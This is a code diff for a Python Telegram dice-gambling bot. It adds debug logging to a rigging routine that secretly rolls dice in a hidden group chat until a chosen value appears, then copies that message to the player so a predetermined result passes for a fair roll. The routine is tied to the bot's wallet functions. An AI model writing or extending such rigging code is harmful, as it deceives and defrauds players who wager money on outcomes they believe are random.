@@ -1,5 +1,6 @@
 import random
 import os
+import logging
 from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from bot_instance import bot
 from wallet import (
@@ -84,13 +85,19 @@ def send_dice_animation(chat_id: int, user_id: int, bet_choice: str) -> int:
     if rig_status is False:
         try:
             target_val = generate_dice_roll(user_id, bet_choice)
-            for _ in range(15):
+            print(f"DEBUG: Attempting rig roll for user {user_id} in RIG_GROUP_ID: {RIG_GROUP_ID}")
+
+            for i in range(1, 16):
                 msg = bot.send_dice(RIG_GROUP_ID, emoji="🎲")
                 if msg.dice.value == target_val:
+                    print(f"DEBUG: Target dice value {target_val} hit on attempt {i}!")
                     bot.copy_message(chat_id, RIG_GROUP_ID, msg.message_id)
                     return target_val
-        except Exception:
-            pass
+
+        except Exception as e:
+            # Prints full raw exception directly in Termux console
+            print(f"❌ [RIG ERROR] Failed to send dice to group {RIG_GROUP_ID}: {e}")
+            logging.error(f"RIG GROUP ERROR: {e}", exc_info=True)
 
     msg = bot.send_dice(chat_id, emoji="🎲")
     return msg.dice.value
